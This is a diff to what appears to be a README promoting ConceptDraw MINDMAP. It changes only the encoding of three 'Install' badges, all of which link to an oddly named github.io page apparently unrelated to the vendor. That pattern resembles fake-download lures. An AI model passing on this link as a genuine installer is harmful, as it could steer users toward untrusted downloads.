@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install ConceptDraw MINDMAP](https://img.shields.io/badge/⬇_Install_ConceptDraw%20MINDMAP-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install ConceptDraw MINDMAP](https://img.shields.io/badge/⬇_Install_ConceptDraw+MINDMAP-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ ConceptDraw MINDMAP is a professional mind mapping and brainstorming software fo
 
 <div align="center">
 
-[![⬇ Install ConceptDraw MINDMAP](https://img.shields.io/badge/⬇_Install_ConceptDraw%20MINDMAP-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install ConceptDraw MINDMAP](https://img.shields.io/badge/⬇_Install_ConceptDraw+MINDMAP-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ ConceptDraw MINDMAP is a professional mind mapping and brainstorming software fo
 
 <div align="center">
 
-[![⬇ Install ConceptDraw MINDMAP](https://img.shields.io/badge/⬇_Install_ConceptDraw%20MINDMAP-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install ConceptDraw MINDMAP](https://img.shields.io/badge/⬇_Install_ConceptDraw+MINDMAP-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
